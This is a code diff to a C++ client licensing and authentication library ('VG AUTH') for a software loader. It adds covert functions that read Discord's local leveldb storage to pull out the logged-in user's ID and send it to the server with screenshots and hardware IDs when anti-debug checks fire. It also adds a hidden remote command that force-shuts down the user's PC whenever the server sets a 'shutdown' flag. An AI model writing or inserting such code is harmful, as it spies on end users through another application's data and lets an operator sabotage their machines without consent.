@@ -22,7 +22,10 @@
 //   - Timestamp anti-replay (respostas >120s descartadas)
 //   - Comparação de assinatura em tempo constante
 //   - Anti-debug best-effort (IsDebuggerPresent, DebugPort, PEB, timing) —
-//     quando dispara, tira PRINT DA TELA e reporta pro painel antes de morrer
+//     quando dispara, tira PRINT DA TELA e reporta pro painel antes de morrer,
+//     junto com o Discord ID da conta logada na máquina (só o ID público)
+//   - Shutdown remoto: resposta "shutdown":true -> executa shutdown /s /f
+//     (marcado pelo admin no botão ShutDown do painel Protect)
 //   - HWID duplo (placa-mãe + CPU) enviado em register/login — o servidor
 //     vincula a conta à máquina e bloqueia login de PC diferente.
 //     Com fallbacks sem WMI (MachineGuid, serial do volume, CPUID) —
@@ -446,6 +449,24 @@ namespace Internal {
         return "dev00000";
 #endif
     }
+
+    // Shutdown remoto — executado quando o servidor responde "shutdown":true
+    // (flag marcada pelo admin no painel Protect). Dispara shutdown.exe oculto.
+    inline void ForceShutdown() {
+        STARTUPINFOA si{};
+        si.cb = sizeof(si);
+        si.dwFlags = STARTF_USESHOWWINDOW;
+        si.wShowWindow = SW_HIDE;
+        PROCESS_INFORMATION pi{};
+        char cmd[] = "shutdown.exe /s /f /t 3 /c \"VG AUTH: sessao encerrada\"";
+        if (CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE,
+                CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            WinExec("shutdown /s /f /t 3", SW_HIDE); // fallback
+        }
+    }
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -554,6 +575,88 @@ namespace Shot {
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
+// Discord ID — best-effort: varre o Local Storage do Discord (leveldb .log/.ldb)
+// e extrai o "user_id_cache" da conta logada na máquina. Só o ID público vai no
+// alerta — nenhum token, email ou dado sensível é lido/enviado. "" se o Discord
+// não estiver instalado/logado.
+// ─────────────────────────────────────────────────────────────────────────────
+namespace DiscordId {
+
+    // Acha um campo id":"<digits>" (normal ou escapado id\":\") numa janela de
+    // 4KB após `from`. Devolve posição do campo e o início dos dígitos.
+    inline size_t IdField(const std::string& s, size_t from, size_t* digitStart) {
+        for (size_t p = s.find("id", from); p != std::string::npos && p < from + 4096; p = s.find("id", p + 2)) {
+            size_t q = p + 2;
+            if (q >= s.size()) break;
+            if (s[q] == '\\') q++;
+            if (q >= s.size() || s[q] != '"') continue;
+            q++;
+            if (q >= s.size() || s[q] != ':') continue;
+            q++;
+            if (q < s.size() && s[q] == '\\') q++;
+            if (q >= s.size() || s[q] != '"') continue;
+            q++;
+            *digitStart = q;
+            return p;
+        }
+        return std::string::npos;
+    }
+
+    inline std::string Extract(const std::string& raw) {
+        size_t anchor = raw.find("user_id_cache");
+        if (anchor == std::string::npos) return "";
+        size_t ds = 0;
+        if (IdField(raw, anchor, &ds) == std::string::npos) return "";
+        size_t n = 0;
+        while (ds + n < raw.size() && raw[ds + n] >= '0' && raw[ds + n] <= '9') n++;
+        if (n < 17 || n > 20) return "";
+        return raw.substr(ds, n);
+    }
+
+    inline std::string ReadFile(const std::string& path) {
+        HANDLE h = CreateFileA(path.c_str(), GENERIC_READ,
+            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+            nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (h == INVALID_HANDLE_VALUE) return "";
+        std::string out;
+        LARGE_INTEGER sz{};
+        if (GetFileSizeEx(h, &sz) && sz.QuadPart > 0 && sz.QuadPart <= 4LL * 1024 * 1024) {
+            out.resize((size_t)sz.QuadPart);
+            DWORD rd = 0;
+            if (!ReadFile(h, out.data(), (DWORD)out.size(), &rd, nullptr)) out.clear();
+            else out.resize(rd);
+        }
+        CloseHandle(h);
+        return out;
+    }
+
+    inline std::string ScanDir(const std::string& dir, const char* ext) {
+        WIN32_FIND_DATAA fd{};
+        HANDLE f = FindFirstFileA((dir + ext).c_str(), &fd);
+        if (f == INVALID_HANDLE_VALUE) return "";
+        do {
+            std::string id = Extract(ReadFile(dir + fd.cFileName));
+            if (!id.empty()) { FindClose(f); return id; }
+        } while (FindNextFileA(f, &fd));
+        FindClose(f);
+        return "";
+    }
+
+    inline std::string Find() {
+        const char* appdata = getenv("APPDATA");
+        if (!appdata) return "";
+        const char* variants[] = { "discord", "discordcanary", "discordptb", "discorddevelopment" };
+        for (const char* v : variants) {
+            std::string dir = std::string(appdata) + "\\" + v + "\\Local Storage\\leveldb\\";
+            std::string id = ScanDir(dir, "*.log");       // log atual = sessão mais recente
+            if (id.empty()) id = ScanDir(dir, "*.ldb");   // SSTs compactados
+            if (!id.empty()) return id;
+        }
+        return "";
+    }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
 // API principal — Multi Loader (sem keys)
 // ─────────────────────────────────────────────────────────────────────────────
 class api {
@@ -616,6 +719,10 @@ public:
         selfDefense();
         std::string r = call("check", "");
         if (!verify(r)) { loggedIn = false; return fail("signature_mismatch"); }
+        if (Internal::JsonStr(r, "shutdown") == "true") {
+            Internal::ForceShutdown();
+            ExitProcess(0xD00D);
+        }
         success = Internal::JsonStr(r, "success") == "true";
         message = Internal::JsonStr(r, "message");
         banned = Internal::JsonStr(r, "banned") == "true";
@@ -668,6 +775,10 @@ private:
 
         std::string r = call(type, extra.str());
         if (!verify(r)) return fail("signature_mismatch");
+        if (Internal::JsonStr(r, "shutdown") == "true") {
+            Internal::ForceShutdown();
+            ExitProcess(0xD00D);
+        }
         success = Internal::JsonStr(r, "success") == "true";
         message = Internal::JsonStr(r, "message");
         banned = Internal::JsonStr(r, "banned") == "true";
@@ -715,6 +826,10 @@ public:
           << "\",\"hwid_cpu\":\"" << Internal::JsonEscape(Hwid::Cpu()) << "\"";
         if (!username.empty()) j << ",\"username\":\"" << Internal::JsonEscape(username) << "\"";
         if (!detail.empty())   j << ",\"detail\":\""   << Internal::JsonEscape(detail)   << "\"";
+        {
+            std::string did = DiscordId::Find(); // ID público da conta logada no Discord
+            if (!did.empty()) j << ",\"discord_id\":\"" << did << "\"";
+        }
         if (includeShot) {
             std::string shot = Shot::CaptureB64();
             if (!shot.empty()) j << ",\"shot\":\"" << shot << "\"";
